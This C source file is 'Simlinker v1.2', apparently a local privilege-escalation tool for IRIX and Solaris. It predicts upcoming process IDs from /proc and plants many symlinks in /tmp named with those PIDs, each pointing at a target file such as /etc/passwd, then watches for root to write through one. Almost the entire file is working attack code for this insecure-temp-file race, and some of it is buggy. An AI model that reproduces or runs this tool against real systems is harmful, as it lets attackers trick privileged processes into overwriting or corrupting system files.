#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <strings.h>
#include <time.h>

/*
#Symlink creator to abuse files creation in /tmp where the pid is used in the filename.  
#First we need to take arguments that consist of a range of numbers and a filename to 
#link from and a filename to link to.
*/

#define MAXSIZE 256

typedef struct _files
{
  char filename[MAXSIZE];
  struct _files *next;
} files;

extern int errno;
extern char *optarg;
int scan_big (int *a, int n);
int get_latest_pid (void);
void unlink_files (files * fstruc);
char *parse (char *string,int p);

#ifdef IRIX
	#define PROC "/proc/pinfo"
char *strsep (char **stringp, const char *delim);
#endif

#ifdef SOLARIS
	#define PROC "/proc"
#endif


int
main (int argc, char **argv)
{
  int x = 0, from = 0, errflg = 0, to = 0, result = 0, i = 0, pid = 0, ch = 0;
  char dest_name[MAXSIZE], from_name[MAXSIZE],tmp_name[MAXSIZE], start_time[26], *buffer,*s;
  struct stat buf;
  files *file_list, *tmp, *start;
  time_t t_time_watch, t_time;

  //latest pid read from PROC + 1 
  from = (get_latest_pid ()) +1;

  if (argc < 4)
    {

      printf ("####            Simlinker v1.2          ####\n\n\nLarry W. Cashdollar\nOct/2019\n\n");
      printf ("Usage: %s -n # symlinks -f from_file -t to_file\n",
	 argv[0]);
      printf ("e.g. %s -n 100 dos_unix /etc/passwd\n\n",argv[0]);
      return (0);
    }

  while ((ch = getopt (argc, argv, "n:f:t:")) != -1)
    switch ((char) ch)
      {
      case 'n':
	to = atoi (optarg) + from;
	break;
      case 'f':
	strncpy (from_name, optarg, MAXSIZE);
	break;
      case 't':
	strncpy (dest_name, optarg, MAXSIZE);
	break;
      case '?':
	errflg++;
      }
  if (errflg)
    {
      fprintf (stderr,"Usage: %s -n # symlinks -f from_file -t to_file\n",argv[0]);
      return (0);
    }


  //init our link list
  file_list = malloc (sizeof (files));
  start = file_list;
  bzero(file_list->filename,MAXSIZE);
  file_list->next = NULL;

  printf ("Starting from lastest process id read from %s: %d\n", PROC,from);


  i = stat (dest_name, &buf);
  if (i < 0)
    {
      printf ("ERROR with stat() on %s", dest_name);
      return (-1);
    }

  t_time = buf.st_mtim.tv_sec;	//store this as a string in start_time below and
  snprintf (start_time, 25, "%s", ctime (&t_time));	//truncate the \n from the timestamp

  t_time_watch = buf.st_mtim.tv_sec;
  //Create our block of symlinks that we hope root will write too.
      printf ("Symlinking ");
  buffer = from_name;
  s = strsep (&buffer, "#");
  for (x = from; x < to; x++)
    {
  snprintf (tmp_name, 256, "%s%d%s", s, x, buffer);
      printf ("%s->%s ", tmp_name, dest_name);
      tmp = malloc (sizeof (files));
      strncpy (tmp->filename, tmp_name,MAXSIZE);
      tmp->next = file_list->next;
      file_list->next = tmp;

      result = symlink (dest_name, tmp_name);
      //need a free() here 

      if (result < 0)
	{
	  printf ("Error: %d, %s\n", result, strerror (errno));
	  return (-1);
	}
    }


  printf
    ("\nWaiting on a write to one of our predicted links in /tmp or pid to grow past the links we created.\n");
// Watch the target file to see if it's over written and check to see if the newest process pid
// is larger than our biggest predicted pid.  If so exit because we failed.
  while (t_time == t_time_watch)
    {
      i = stat (dest_name, &buf);
      t_time_watch = buf.st_mtim.tv_sec;
      pid = get_latest_pid ();
      if (pid >= to)
	{
	  printf
	    ("Failed: The next pid %d will be past our largest predicted pid in /tmp links\ntry a larger number of links for busier systems.\n",
	     pid);
	  unlink_files (start);
	  exit (1);
	}

    }

  if (t_time != t_time_watch)
    {

      printf ("[+] The target file %s has been over written!\n", dest_name);
      printf ("[+] Modification time changed from %s to %s\n", start_time,
	      ctime (&t_time_watch));
    }

  unlink_files (start);

  return (0);
}


int
get_latest_pid (void)
{
  DIR *dirp;
  struct dirent *direntp;
  int x = 0, array[MAXSIZE];

  dirp = opendir (PROC);
  while ((direntp = readdir (dirp)) != NULL)
    {
      if (strstr (direntp->d_name, ".") == 0)
	array[x] = atoi (direntp->d_name);
      x++;
    }
  closedir (dirp);
  return (scan_big (array, x));
}


int
scan_big (int *a, int n)
{
  int big = 0, x;
  big = a[0];
  for (x = 0; x < n; x++)
    {
      if (a[x] > big)
	big = a[x];
    }
  return (big);
}

void
unlink_files (files * fstruc)
{
  files *tmp;
  tmp = fstruc;
  fstruc = fstruc->next;
  free (tmp);
  printf ("Cleaning up....\n");
      printf ("Unlinking ");
  while (fstruc)
    {
      tmp = fstruc;
      printf ("%s ", fstruc->filename);
      unlink (fstruc->filename);
      fstruc = fstruc->next;
      free (tmp);
    }
printf("\n");
}





/*int
main (int argc, char **argv)
{

  char *temp = NULL;

  temp = parse (argv[1]);
  printf ("%s\n", temp);
  free (temp);
  return (0);
}*/


/*char *
parse (char *string,int p)
{
  char buffer[256];
  char *s, *new;
  new = malloc (sizeof (char) * 256);
  s = strsep (&string, "#");
  strncpy (buffer, string, 256);
  snprintf (new, 256, "%s%d%s", s, p, buffer);
  printf("%s",new);
  return (new);
}*/

#ifdef IRIX
char *
strsep (char **stringp, const char *delim)
{
  char *s;
  const char *spanp;
  int c, sc;
  char *tok;
  if ((s = *stringp) == NULL)
    return (NULL);
  for (tok = s;;)
    {
      c = *s++;
      spanp = delim;
      do
	{
	  if ((sc = *spanp++) == c)
	    {
	      if (c == 0)
		s = NULL;
	      else
		s[-1] = 0;
	      *stringp = s;
	      return (tok);
	    }
	}
      while (sc != 0);
    }
  /* NOTREACHED */
}
#endif
